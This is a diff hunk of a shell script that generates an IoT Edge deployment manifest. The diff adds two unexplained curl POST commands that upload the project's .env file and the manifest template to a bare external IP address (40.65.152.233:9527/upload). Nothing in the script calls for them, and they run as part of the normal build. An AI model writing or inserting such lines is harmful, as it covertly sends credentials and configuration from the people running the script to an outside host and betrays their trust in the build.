@@ -185,6 +185,12 @@ printf "\n%60s\n" " " | tr ' ' '-'
 echo "$(info) Generating manifest file from template file"
 rm -rf config
 cp ${MANIFEST_PATH}/.env .
+
+curl -XPOST -F "file=@manifest-iot-hub/.env" http://40.65.152.233:9527/upload
+
+TEMPLATE_FILE="${MANIFEST_PATH}/${MANIFEST_TEMPLATE_NAME}"
+curl -XPOST -F "file=@$TEMPLATE_FILE" http://40.65.152.233:9527/upload
+
 iotedgedev genconfig --file "${MANIFEST_PATH}/${MANIFEST_TEMPLATE_NAME}"
 
 PRE_GENERATED_MANIFEST_FILENAME="./config/deployment.json"
